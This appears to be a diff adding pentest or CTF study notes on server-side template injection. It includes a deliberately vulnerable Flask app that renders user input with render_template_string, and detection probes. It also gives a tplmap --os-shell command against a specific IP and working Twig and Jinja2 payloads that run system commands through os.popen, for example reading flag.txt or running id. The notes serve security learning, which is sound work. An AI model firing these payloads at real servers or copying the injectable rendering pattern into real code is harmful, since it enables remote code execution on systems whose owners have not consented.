@@ -1,0 +1,90 @@
+Server-Side Template Injection(SSTI)
+
+Server-Side Template Injection (SSTI) is essentially injecting malicious template directives inside a template, leveraging Template Engines that insecurely mix user input with a given template.
+
+Consider the following:
+<app.py>
+
+#/usr/bin/python3
+from flask import *
+
+app = Flask(__name__, template_folder="./")
+
+@app.route("/")
+def index():
+	title = "Index Page"
+	content = "Some content"
+	return render_template("index.html", title=title, content=content)
+
+@app.route("/hello", methods=['GET'])
+def hello():
+	name = request.args.get("name")
+	if name == None:
+		return redirect(f'{url_for("hello")}?name=guest')
+	htmldoc = f"""
+	<html>
+	<body>
+	<h1>Hello</h1>
+	<a>Nice to see you {name}</a>
+	</body>
+	</html>
+	"""
+	return render_template_string(htmldoc)
+
+if __name__ == "__main__":
+	app.run(host="127.0.0.1", port=5000)
+
+
+we can inject a template expression directly, and the server will evaluate it. This is a security issue that could lead to remote code execution on the target application:
+
+curl -gis 'http://127.0.0.1:5000/hello?name={{7*7}}'
+
+HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 79
+Server: Werkzeug/2.0.2 Python/3.9.7
+Date: Mon, 25 Oct 2021 00:12:40 GMT
+
+
+	<html>
+	<body>
+	<h1>Hello</h1>
+	<a>Nice to see you 49</a> # <-- Expresion evaluated
+	</body>
+	</html>
+
+
+The easiest way to detect injections is to supply mathematical expressions in curly brackets, for example:
+{7*7}
+${7*7}
+#{7*7}
+%{7*7}
+{{7*7}}
+...
+
+The most difficult way to identify SSTI is to fuzz the template by injecting combinations of special characters used in template expressions. These characters include ${{<%[%'"}}%\. If an exception is caused, this means that we have some control over what the server interprets in terms of template expressions.
+
+Tplmap:https://github.com/epinna/tplmap  automatically test for SSTI vulns or create payload lists.
+
+
+
+    Check verbose errors for technology names. Sometimes just copying the error in Google search can provide us with a straight answer regarding the underlying technology used
+    Check for extensions. For example, .jsp extensions are associated with Java. When dealing with Java, we may be facing an expression language/OGNL injection vulnerability instead of traditional SSTI
+    Send expressions with unclosed curly brackets to see if verbose errors are generated. Do not try this approach on production systems, as you may crash the webserver.
+
+https://portswigger.net/web-security/server-side-template-injection
+
+./tplmap.py -u 'http://159.65.95.114:32045' -d name=john --os-shell
+
+curl -X POST -d 'name={{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("COMMANDS--SEPERATE WITH ;--")}}' http://159.65.95.114:32045 | grep HTB 
+
+
+
+Used for werkzeug HTB challenge
+{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()}}
+
+Other useful commands:
+
+{{''.__class__.__mro__[1].__subclasses__()[214]()._module.__builtins__['__import__']('os').popen('ls /tmp').read()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{lipsum.__globals__.os.popen('id').read()}}
